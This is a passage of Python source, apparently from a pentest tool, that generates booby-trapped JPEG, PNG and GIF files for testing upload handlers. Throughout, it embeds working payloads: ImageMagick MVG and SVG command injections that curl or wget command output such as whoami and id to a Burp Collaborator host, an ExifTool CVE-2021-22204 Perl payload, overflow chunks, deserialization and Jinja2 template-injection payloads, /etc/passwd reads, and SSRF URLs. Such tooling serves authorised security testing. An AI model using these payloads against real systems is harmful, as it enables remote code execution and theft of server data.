        # RCE: rce27_libjpeg_overflow.jpg - Buffer overflow dans le parser
        # DETECTION: Crash de l'application ou erreur dans les logs
        # OBSERVER: Le payload cause un dépassement de buffer qui peut mener à l'exécution de code
        # Vérifier les logs serveur pour des erreurs de segmentation fault ou stack overflow
        # Alternative: utiliser un payload qui cause un crash visible dans la réponse HTTP
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce27_libjpeg_overflow.jpg"
            img.save(img_path, 'JPEG')
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            overflow_payload = b'A' * 65533
            com_marker = b'\xFF\xFE'
            com_length = struct.pack('>H', len(overflow_payload) + 2)
            com_chunk = com_marker + com_length + overflow_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = com_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # RCE: rce28_exiftool_makernotes.jpg - ExifTool DjVu polyglotte (CVE-2021-22204)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: ExifTool va parser le fichier DjVu et exécuter du code Perl
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        # Le payload contient du code Perl qui sera exécuté lors du parsing
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce28_exiftool_makernotes.jpg"
            img.save(img_path, 'JPEG')
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            makernotes_payload = f'eval("system(\\"curl {base_url}/rce-makernotes\\");")'
            makernotes_marker = b'\xFF\xE6'
            makernotes_identifier = b'MakerNote\x00'
            makernotes_data = makernotes_payload.encode('utf-8')
            makernotes_length = struct.pack('>H', len(makernotes_identifier) + len(makernotes_data) + 2)
            makernotes_chunk = makernotes_marker + makernotes_length + makernotes_identifier + makernotes_data
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = makernotes_chunk
        
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # RCE: rce29_tiff_in_png.png - Command execution
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers burp_collab avec paramètre contenant la sortie de la commande
        # Vérifier dans Burp Collaborator: requête reçue avec le résultat de la commande
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce29_tiff_in_png.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            tiff_header = b'II*\x00'
            tiff_payload = b'\x00\x00\x00\x00' + b'A' * 10000
            tiff_chunk_keyword = b'TIFF'
            tiff_chunk_data = tiff_chunk_keyword + b'\x00' + tiff_header + tiff_payload
            tiff_chunk_length = struct.pack('>I', len(tiff_chunk_data))
            tiff_chunk_type = b'tEXt'
            tiff_chunk_crc = struct.pack('>I', zlib.crc32(tiff_chunk_type + tiff_chunk_data) & 0xffffffff)
            tiff_chunk = tiff_chunk_length + tiff_chunk_type + tiff_chunk_data + tiff_chunk_crc
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
            png_data[iend_chunk_start:iend_chunk_start] = tiff_chunk
        
            with open(img_path, 'wb') as f:
                f.write(png_data)
    
    if (ext == 'jpg' or ext == 'jpeg' or ext == 'gif') and (should_generate_type('rce') or should_generate_type('ssrf') or should_generate_type('xxe')):
        if ext == 'jpg' or ext == 'jpeg':
            img = Image.new('RGB', (100, 100), color='red')
            img_format = 'JPEG'
            file_ext = 'jpg'
        elif ext == 'gif':
            gif_header = b'GIF89a'
            gif_trailer = b'\x00;'
            file_ext = 'gif'
        
        def add_mvg_to_jpeg(img_data, mvg_payload):
            xmp_payload = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>{mvg_payload}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
            app1_marker = b'\xFF\xE1'
            app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
            app1_length = struct.pack('>H', len(xmp_payload) + len(app1_identifier) + 2)
            app1_chunk = app1_marker + app1_length + app1_identifier + xmp_payload
            soi_pos = img_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                img_data[insert_pos:insert_pos] = app1_chunk
            return img_data
        
        def add_mvg_to_gif(gif_header, gif_trailer, mvg_payload):
            comment_extension = b'\x21\xFE'
            comment_payload = f'ImageMagick:{mvg_payload}'.encode('utf-8')
            comment_length = bytes([min(len(comment_payload), 255)])
            comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
            return gif_header + comment_chunk + gif_trailer
        
        if should_generate_type('rce'):
            if ext == 'jpg' or ext == 'jpeg':
                rce_payloads = {
                    1: f'''push graphic-context
viewbox 0 0 640 480
fill 'url(https://{burp_collab}/rce-imagemagick?`curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-imagemagick`)'
pop graphic-context''',
                    2: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget --header="X-RCE-Proof: $(id)" {base_url}/rce-delegate`" width="100" height="100"/>
</svg>''',
                    3: f'''push graphic-context
image over 0,0 0,0 "https://{burp_collab}/rce-mvg?$(curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-mvg)"
pop graphic-context''',
                    4: f'''push graphic-context
viewbox 0 0 640 480
fill "label:@/dev/stdin"
pop graphic-context''',
                    5: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-svg-delegate" width="100" height="100"/>
</svg>''',
                    6: f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-https?$(wget --header="X-RCE-Proof: $(id)" {base_url}/rce-https))
pop graphic-context''',
                    7: f'''push graphic-context
viewbox 0 0 640 480
fill url(http://{burp_collab}/rce-http?$(curl -H "X-RCE-Proof: $(pwd)" {base_url}/rce-http))
pop graphic-context''',
                    8: f'''push graphic-context
viewbox 0 0 640 480
fill url(ftp://{burp_collab}/rce-ftp?$(id))
pop graphic-context''',
                    9: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/rce-msl?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-msl)\\" /></image>"
pop graphic-context''',
                    10: f'''push graphic-context
viewbox 0 0 640 480
fill "text:@https://{burp_collab}/rce-text?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-text)"
pop graphic-context''',
                    11: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "epi:https://{burp_collab}/rce-epi?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-epi)"
pop graphic-context''',
                    12: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "ps:https://{burp_collab}/rce-ps?$(curl -H \\"X-RCE-Proof: $(hostname)\\" {base_url}/rce-ps)"
pop graphic-context''',
                    13: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-multi-https?$(curl -H \\"X-RCE-Proof: $(id)\\" {base_url}/rce-multi-https)" width="100" height="100"/>
<image xlink:href="http://{burp_collab}/rce-multi-http?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-multi-http)" width="100" height="100"/>
</svg>''',
                    14: f'''push graphic-context
viewbox 0 0 640 480
fill url(file:///etc/passwd)
pop graphic-context''',
                    15: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "rar:https://{burp_collab}/rce-rar?$(curl -H \\"X-RCE-Proof: $(pwd)\\" {base_url}/rce-rar)"
pop graphic-context''',
                    16: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "zip:https://{burp_collab}/rce-zip?$(curl -H \\"X-RCE-Proof: $(ls -la | head -c 200)\\" {base_url}/rce-zip)"
pop graphic-context''',
                    17: f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-backtick?`curl -H "X-RCE-Proof: $(echo RCE_SUCCESS)" {base_url}/rce-backtick`)
pop graphic-context''',
                    18: f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-dollar?$(curl -H "X-RCE-Proof: $(hostname)" {base_url}/rce-dollar))
pop graphic-context''',
                    19: f'''<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/ecmascript"> <![CDATA[ fetch("https://{burp_collab}/rce-svg-script?proof="+encodeURIComponent("RCE_SUCCESS")) ]]></script>
<rect width="100" height="100"/>
</svg>''',
                    20: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "exec:curl -H \\"X-RCE-Proof: $(date)\\" https://{burp_collab}/rce-exec"
pop graphic-context'''
                }
                
                rce_names = {
                    1: "imagemagick", 2: "imagemagick_delegate", 3: "mvg_delegate", 4: "mvg_label",
                    5: "svg_delegate", 6: "mvg_https_cmd", 7: "mvg_http_cmd", 8: "mvg_ftp",
                    9: "mvg_msl", 10: "mvg_text", 11: "mvg_epi", 12: "mvg_ps",
                    13: "svg_multi", 14: "mvg_file", 15: "mvg_rar", 16: "mvg_zip",
                    17: "mvg_backtick", 18: "mvg_dollar", 19: "svg_script", 20: "mvg_exec"
                }
                
                for rce_num in range(1, 21):
                    if rce_num in rce_payloads:
                        rce_suffix = rce_names.get(rce_num, f"rce{rce_num}")
                        img_path = rce_dir / f"rce{rce_num}_{rce_suffix}.{file_ext}"
                        img.save(img_path, img_format)
                        with open(img_path, 'rb') as f:
                            img_data = bytearray(f.read())
                        img_data = add_mvg_to_jpeg(img_data, rce_payloads[rce_num])
                        with open(img_path, 'wb') as f:
                            f.write(img_data)
                
                if should_generate(['php', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
                    img_path = rce_dir / "rce21_unserialize_text.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        phpggc_payload = generate_phpggc_for_jpeg_exif(burp_collab, 'Monolog/RCE1')
                        serialize_payload = phpggc_payload if phpggc_payload else 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
                    else:
                        serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
                    com_marker = b'\xFF\xFE'
                    com_payload = serialize_payload.encode('utf-8')
                    com_length = struct.pack('>H', len(com_payload) + 2)
                    com_chunk = com_marker + com_length + com_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                
                if should_generate(['all']) and should_generate_type('rce'):
                    img_path = rce_dir / "rce22_chunk_overflow.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    overflow_payload = b'A' * 2000
                    com_marker = b'\xFF\xFE'
                    com_length = struct.pack('>H', len(overflow_payload) + 2)
                    com_chunk = com_marker + com_length + overflow_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                
                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
                    img_path = rce_dir / "rce26_python_pickle_text.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        pickle_payload_b64 = generate_python_pickle_for_png(burp_collab)
                        serialize_payload = pickle_payload_b64 if pickle_payload_b64 else 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
                    else:
                        serialize_payload = 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
                    com_marker = b'\xFF\xFE'
                    com_payload = serialize_payload.encode('utf-8')
                    com_length = struct.pack('>H', len(com_payload) + 2)
                    com_chunk = com_marker + com_length + com_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                
                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
                    img_path = rce_dir / "rce27_python_yaml_text.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        yaml_payload = generate_python_yaml_for_png(burp_collab)
                        serialize_payload = yaml_payload if yaml_payload else '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
                    else:
                        serialize_payload = '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
                    com_marker = b'\xFF\xFE'
                    com_payload = serialize_payload.encode('utf-8')
                    com_length = struct.pack('>H', len(com_payload) + 2)
                    com_chunk = com_marker + com_length + com_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                
                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
                    img_path = rce_dir / "rce28_ruby_marshal_text.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        marshal_payload = generate_ruby_marshal_for_png(burp_collab)
                        serialize_payload = marshal_payload if marshal_payload else '\x04\x08I"\x10test\x06:\x06ET'
                    else:
                        serialize_payload = '\x04\x08I"\x10test\x06:\x06ET'
                    com_marker = b'\xFF\xFE'
                    com_payload = serialize_payload.encode('latin-1')
                    com_length = struct.pack('>H', len(com_payload) + 2)
                    com_chunk = com_marker + com_length + com_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                
                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
                    img_path = rce_dir / "rce29_ruby_yaml_text.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        yaml_payload = generate_ruby_yaml_for_png(burp_collab)
                        serialize_payload = yaml_payload if yaml_payload else '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
                    else:
                        serialize_payload = '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
                    com_marker = b'\xFF\xFE'
                    com_payload = serialize_payload.encode('utf-8')
                    com_length = struct.pack('>H', len(com_payload) + 2)
                    com_chunk = com_marker + com_length + com_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                
                if should_generate(['nodejs', 'all']) and should_generate_type('deserialization'):
                    img_path = rce_dir / "rce30_nodejs_serialize_text.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        nodejs_payload = generate_nodejs_serialize_for_png(burp_collab)
                        serialize_payload = nodejs_payload if nodejs_payload else '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
                    else:
                        serialize_payload = '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
                    com_marker = b'\xFF\xFE'
                    com_payload = serialize_payload.encode('utf-8')
                    com_length = struct.pack('>H', len(com_payload) + 2)
                    com_chunk = com_marker + com_length + com_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                
                if should_generate(['python', 'all']) and (should_generate_type('ssti') or should_generate_type('rce') or should_generate_type('deserialization')):
                    img_path = rce_dir / "rce31_ssti_jinja2_text.jpg"
                    img.save(img_path, img_format)
                    with open(img_path, 'rb') as f:
                        img_data = bytearray(f.read())
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        ssti_payload = generate_ssti_payload('jinja2', f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ssti-jinja2", burp_collab)
                    else:
                        ssti_payload = f'{{{{config.__class__.__init__.__globals__["os"].popen("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-jinja2").read()}}}}'
                    com_marker = b'\xFF\xFE'
                    com_payload = ssti_payload.encode('utf-8')
                    com_length = struct.pack('>H', len(com_payload) + 2)
                    com_chunk = com_marker + com_length + com_payload
                    soi_pos = img_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        img_data[insert_pos:insert_pos] = com_chunk
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
            
            elif ext == 'gif':
                rce_payloads_gif = {
                    1: f'''push graphic-context
viewbox 0 0 640 480
fill 'url(https://{burp_collab}/rce-imagemagick?`curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-imagemagick`)'
pop graphic-context''',
                    2: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget --header="X-RCE-Proof: $(id)" {base_url}/rce-delegate`" width="100" height="100"/>
</svg>''',
                    3: f'''push graphic-context
image over 0,0 0,0 "https://{burp_collab}/rce-mvg?$(curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-mvg)"
pop graphic-context''',
                    4: f'''push graphic-context
viewbox 0 0 640 480
fill "label:@/dev/stdin"
pop graphic-context''',
                    5: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-svg-delegate" width="100" height="100"/>
</svg>''',
                    6: f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-https?$(wget --header="X-RCE-Proof: $(id)" {base_url}/rce-https))
pop graphic-context''',
                    7: f'''push graphic-context
viewbox 0 0 640 480
fill url(http://{burp_collab}/rce-http?$(curl -H "X-RCE-Proof: $(pwd)" {base_url}/rce-http))
pop graphic-context''',
                    8: f'''push graphic-context
viewbox 0 0 640 480
fill url(ftp://{burp_collab}/rce-ftp?$(id))
pop graphic-context''',
                    9: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/rce-msl?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-msl)\\" /></image>"
pop graphic-context''',
                    10: f'''push graphic-context
viewbox 0 0 640 480
fill "text:@https://{burp_collab}/rce-text?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-text)"
pop graphic-context''',
                    11: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "epi:https://{burp_collab}/rce-epi?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-epi)"
pop graphic-context''',
                    12: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "ps:https://{burp_collab}/rce-ps?$(curl -H \\"X-RCE-Proof: $(hostname)\\" {base_url}/rce-ps)"
pop graphic-context''',
                    13: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-multi-https?$(curl -H \\"X-RCE-Proof: $(id)\\" {base_url}/rce-multi-https)" width="100" height="100"/>
<image xlink:href="http://{burp_collab}/rce-multi-http?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-multi-http)" width="100" height="100"/>
</svg>''',
                    14: f'''push graphic-context
viewbox 0 0 640 480
fill url(file:///etc/passwd)
pop graphic-context''',
                    15: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "rar:https://{burp_collab}/rce-rar?$(curl -H \\"X-RCE-Proof: $(pwd)\\" {base_url}/rce-rar)"
pop graphic-context''',
                    16: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "zip:https://{burp_collab}/rce-zip?$(curl -H \\"X-RCE-Proof: $(ls -la | head -c 200)\\" {base_url}/rce-zip)"
pop graphic-context''',
                    17: f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-backtick?`curl -H "X-RCE-Proof: $(echo RCE_SUCCESS)" {base_url}/rce-backtick`)
pop graphic-context''',
                    18: f'''push graphic-context
viewbox 0 0 640 480
fill url(https://{burp_collab}/rce-dollar?$(curl -H "X-RCE-Proof: $(hostname)" {base_url}/rce-dollar))
pop graphic-context''',
                    19: f'''<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/ecmascript"> <![CDATA[ fetch("https://{burp_collab}/rce-svg-script?proof="+encodeURIComponent("RCE_SUCCESS")) ]]></script>
<rect width="100" height="100"/>
</svg>''',
                    20: f'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "exec:curl -H \\"X-RCE-Proof: $(date)\\" https://{burp_collab}/rce-exec"
pop graphic-context'''
                }
                
                rce_names_gif = {
                    1: "imagemagick", 2: "imagemagick_delegate", 3: "mvg_delegate", 4: "mvg_label",
                    5: "svg_delegate", 6: "mvg_https_cmd", 7: "mvg_http_cmd", 8: "mvg_ftp",
                    9: "mvg_msl", 10: "mvg_text", 11: "mvg_epi", 12: "mvg_ps",
                    13: "svg_multi", 14: "mvg_file", 15: "mvg_rar", 16: "mvg_zip",
                    17: "mvg_backtick", 18: "mvg_dollar", 19: "svg_script", 20: "mvg_exec"
                }
                
                for rce_num in range(1, 21):
                    if rce_num in rce_payloads_gif:
                        rce_suffix = rce_names_gif.get(rce_num, f"rce{rce_num}")
                        gif_content = add_mvg_to_gif(gif_header, gif_trailer, rce_payloads_gif[rce_num])
                        with open(rce_dir / f"rce{rce_num}_{rce_suffix}.gif", 'wb') as f:
                            f.write(gif_content)
                
                if should_generate(['php', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
                    comment_extension = b'\x21\xFE'
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        phpggc_payload = generate_phpggc_for_png_text(burp_collab, 'Monolog/RCE1')
                        serialize_payload = phpggc_payload if phpggc_payload else 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
                    else:
                        serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
                    comment_payload = serialize_payload.encode('utf-8')
                    comment_length = bytes([min(len(comment_payload), 255)])
                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce21_unserialize_text.gif", 'wb') as f:
                        f.write(gif_content)
                
                if should_generate(['all']) and should_generate_type('rce'):
                    comment_extension = b'\x21\xFE'
                    overflow_payload = b'A' * 2000
                    comment_length = bytes([min(len(overflow_payload), 255)])
                    comment_chunk = comment_extension + comment_length + overflow_payload[:255] + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce22_chunk_overflow.gif", 'wb') as f:
                        f.write(gif_content)
                
                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
                    comment_extension = b'\x21\xFE'
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        pickle_payload_b64 = generate_python_pickle_for_png(burp_collab)
                        serialize_payload = pickle_payload_b64 if pickle_payload_b64 else 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
                    else:
                        serialize_payload = 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
                    comment_payload = serialize_payload.encode('utf-8')
                    comment_length = bytes([min(len(comment_payload), 255)])
                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce26_python_pickle_text.gif", 'wb') as f:
                        f.write(gif_content)
                
                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
                    comment_extension = b'\x21\xFE'
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        yaml_payload = generate_python_yaml_for_png(burp_collab)
                        serialize_payload = yaml_payload if yaml_payload else '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
                    else:
                        serialize_payload = '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
                    comment_payload = serialize_payload.encode('utf-8')
                    comment_length = bytes([min(len(comment_payload), 255)])
                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce27_python_yaml_text.gif", 'wb') as f:
                        f.write(gif_content)
                
                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
                    comment_extension = b'\x21\xFE'
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        marshal_payload = generate_ruby_marshal_for_png(burp_collab)
                        serialize_payload = marshal_payload if marshal_payload else '\x04\x08I"\x10test\x06:\x06ET'
                    else:
                        serialize_payload = '\x04\x08I"\x10test\x06:\x06ET'
                    comment_payload = serialize_payload.encode('latin-1')
                    comment_length = bytes([min(len(comment_payload), 255)])
                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce28_ruby_marshal_text.gif", 'wb') as f:
                        f.write(gif_content)
                
                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
                    comment_extension = b'\x21\xFE'
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        yaml_payload = generate_ruby_yaml_for_png(burp_collab)
                        serialize_payload = yaml_payload if yaml_payload else '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
                    else:
                        serialize_payload = '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
                    comment_payload = serialize_payload.encode('utf-8')
                    comment_length = bytes([min(len(comment_payload), 255)])
                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce29_ruby_yaml_text.gif", 'wb') as f:
                        f.write(gif_content)
                
                if should_generate(['nodejs', 'all']) and should_generate_type('deserialization'):
                    comment_extension = b'\x21\xFE'
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        nodejs_payload = generate_nodejs_serialize_for_png(burp_collab)
                        serialize_payload = nodejs_payload if nodejs_payload else '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
                    else:
                        serialize_payload = '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
                    comment_payload = serialize_payload.encode('utf-8')
                    comment_length = bytes([min(len(comment_payload), 255)])
                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce30_nodejs_serialize_text.gif", 'wb') as f:
                        f.write(gif_content)
                
                if should_generate(['python', 'all']) and (should_generate_type('ssti') or should_generate_type('rce') or should_generate_type('deserialization')):
                    comment_extension = b'\x21\xFE'
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        ssti_payload = generate_ssti_payload('jinja2', f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ssti-jinja2", burp_collab)
                    else:
                        ssti_payload = f'{{{{config.__class__.__init__.__globals__["os"].popen("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-jinja2").read()}}}}'
                    comment_payload = ssti_payload.encode('utf-8')
                    comment_length = bytes([min(len(comment_payload), 255)])
                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                    gif_content = gif_header + comment_chunk + gif_trailer
                    with open(rce_dir / "rce31_ssti_jinja2_text.gif", 'wb') as f:
                        f.write(gif_content)
        
        if should_generate_type('ssrf'):
            ssrf_payloads = {
                1: f'http://{burp_collab}/ssrf-1',
                2: f'https://{burp_collab}/ssrf-mvg',
                3: f'http://{burp_collab}/ssrf-mvg-http',
                4: f'ftp://{burp_collab}/ssrf-ftp',
                5: f'https://{burp_collab}/ssrf-https',
                6: f'http://{burp_collab}/ssrf-http',
                7: f'ftp://{burp_collab}/ssrf-ftp',
                8: f'gopher://{burp_collab}/ssrf-gopher',
                9: f'ldap://{burp_collab}/ssrf-ldap',
                10: f'file:///etc/passwd',
                11: f'https://{burp_collab}/ssrf-image-https',
                12: f'http://{burp_collab}/ssrf-image-http',
                13: f'https://{burp_collab}/ssrf-svg',
                14: f'https://{burp_collab}/ssrf-msl',
                15: f'https://{burp_collab}/ssrf-epi',
                16: f'https://{burp_collab}/ssrf-ps',
                17: f'https://{burp_collab}/ssrf-text',
                18: f'https://{burp_collab}/ssrf-multi',
                19: f'https://{burp_collab}/ssrf-rar',
                20: f'https://{burp_collab}/ssrf-zip',
                21: f'http://{burp_collab}/ssrf-itxt'
            }
            
            ssrf_names = {
                1: "com", 2: "mvg_url", 3: "mvg_http", 4: "mvg_ftp",
                5: "svg_https", 6: "svg_http", 7: "svg_ftp", 8: "mvg_gopher",
